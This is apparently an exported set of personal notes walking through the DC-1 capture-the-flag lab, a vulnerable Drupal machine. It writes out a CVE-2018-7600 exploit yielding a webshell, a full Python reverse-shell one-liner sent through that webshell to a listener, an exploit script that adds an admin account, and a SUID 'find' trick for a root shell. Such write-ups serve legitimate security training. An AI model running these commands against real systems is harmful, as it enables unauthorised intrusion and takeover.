<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>DC-1</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>DC-1</h1><br/>Drupwn&gt; exploit CVE-2018-7600                                                       <br /><br />[+] Exploit completed. Webshell accessible at: <a href="http://192.168.11.137/497PAZ.php?c=CMD">http://192.168.11.137/497PAZ.php?c=CMD</a><br /><br />nc -nlvp 3233<br />view-source:<a href="http://192.168.11.137/497PAZ.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.11.136%22,3233));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27">http://192.168.11.137/497PAZ.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.11.136%22,3233));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27</a><br /><br />searchsploit drupal<br />python 34992.py -t <a href="http://192.168.11.137">http://192.168.11.137</a> -u squid -p 12qwaszx<br /><br /><br />*settings.php has creds*<br /><br /><br /><br /><br />------------------------------------------------------------<br />scanned with nmap<br />saw drupal and downloaded drupwn to scan the web server<br />drupal found CVE-2018-7600 and got me a web shell<br />used  python oneliner from “Quick Commands/shells” in my notes and got a reverse shell<br />found flag 1 in /var/www<br />grep -r “flag[12345]” found flag 2 in the settings.php file<br />in settings.php I found mysql creds<br />used creds to login and found an admin username with a hash<br />could not break hash<br />abandoned mysql<br />found flag4 in the home directory<br />initiated “/Privesc/Linux/QuickPrivCheck” find / -perm 4000<br />saw /usr/bin/find was running with the SUID of root<br />find /etc/shadow -exec sh \;        And got a root shell!!<br />thefinalflag.txt was in /root/<br />still having not gotten into the website (assuming that was where flag3.txt was)<br />searchsploit drupal and look for 7.0<br />saw 34992.py added a user account<br />python 34992.py -t <a href="http://192.168.11.137">http://192.168.11.137</a> -u squid -p 12qwaszx<br />logged in with new creds and got flag3.txt<br /><br /><br /><br /></div></body></html>